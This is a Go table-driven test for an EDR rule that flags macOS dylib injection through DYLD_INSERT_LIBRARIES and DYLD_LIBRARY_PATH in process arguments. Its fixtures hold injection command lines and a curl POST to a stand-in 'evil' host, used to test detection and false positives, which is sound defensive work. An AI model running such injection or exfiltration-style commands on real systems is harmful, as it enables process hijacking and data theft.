package rules

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/store"
)

func TestDyldInsert_TableDriven(t *testing.T) {
	type fixture struct {
		name        string
		path        string
		args        []string
		wantFinding bool
	}

	cases := []fixture{
		{
			name:        "DYLD_INSERT_LIBRARIES leading shell-style prefix fires",
			path:        "/bin/ls",
			args:        []string{"DYLD_INSERT_LIBRARIES=/tmp/inject.dylib", "/bin/ls", "-la"},
			wantFinding: true,
		},
		{
			name:        "DYLD_LIBRARY_PATH through env command fires",
			path:        "/usr/bin/env",
			args:        []string{"/usr/bin/env", "DYLD_LIBRARY_PATH=/tmp", "/bin/ls"},
			wantFinding: true,
		},
		{
			name:        "plain ls without env does NOT fire",
			path:        "/bin/ls",
			args:        []string{"/bin/ls", "-la"},
			wantFinding: false,
		},
		{
			name:        "DYLD_FALLBACK_LIBRARY_PATH does NOT fire — not on MVP list",
			path:        "/bin/ls",
			args:        []string{"DYLD_FALLBACK_LIBRARY_PATH=/tmp", "/bin/ls"},
			wantFinding: false,
		},
		{
			name:        "similar but-not-matching arg does NOT fire",
			path:        "/bin/ls",
			args:        []string{"MY_DYLD_INSERT_LIBRARIES=/tmp/inject.dylib", "/bin/ls"},
			wantFinding: false,
		},
		{
			// Regression: CodeRabbit flagged scanning every argv element as a false-positive
			// vector. echo / printf are the canonical "data through argv" shapes — the rule
			// must not fire just because a process prints the variable name.
			name:        "DYLD_INSERT_LIBRARIES as echo DATA does NOT fire",
			path:        "/bin/echo",
			args:        []string{"/bin/echo", "DYLD_INSERT_LIBRARIES=/tmp/inject.dylib"},
			wantFinding: false,
		},
		{
			name:        "DYLD_INSERT_LIBRARIES in curl --data does NOT fire",
			path:        "/usr/bin/curl",
			args:        []string{"/usr/bin/curl", "-X", "POST", "--data", "DYLD_INSERT_LIBRARIES=/tmp/x", "https://evil"},
			wantFinding: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := store.OpenTestStore(t)
			ctx := t.Context()

			payload, _ := json.Marshal(map[string]any{
				"pid": 100, "ppid": 50, "path": tc.path, "args": tc.args,
				"uid": 501, "gid": 20,
			})
			events := []store.Event{
				{EventID: "fork", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
					Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
				{EventID: "exec", HostID: "host-a", TimestampNs: 1100, EventType: "exec", Payload: payload},
			}
			require.NoError(t, s.InsertEvents(ctx, events))
			materialize(t, s, events)

			rule := &DyldInsert{}
			findings, err := rule.Evaluate(ctx, events, s)
			require.NoError(t, err)

			if !tc.wantFinding {
				assert.Empty(t, findings)
				return
			}
			require.Len(t, findings, 1)
			assert.Equal(t, "dyld_insert", findings[0].RuleID)
			assert.Equal(t, "high", findings[0].Severity)
			assert.Contains(t, findings[0].Description, "<redacted>",
				"description must not echo the raw dylib path")
			assert.NotContains(t, findings[0].Description, "/tmp/inject.dylib",
				"description must not echo the raw dylib path")
		})
	}
}
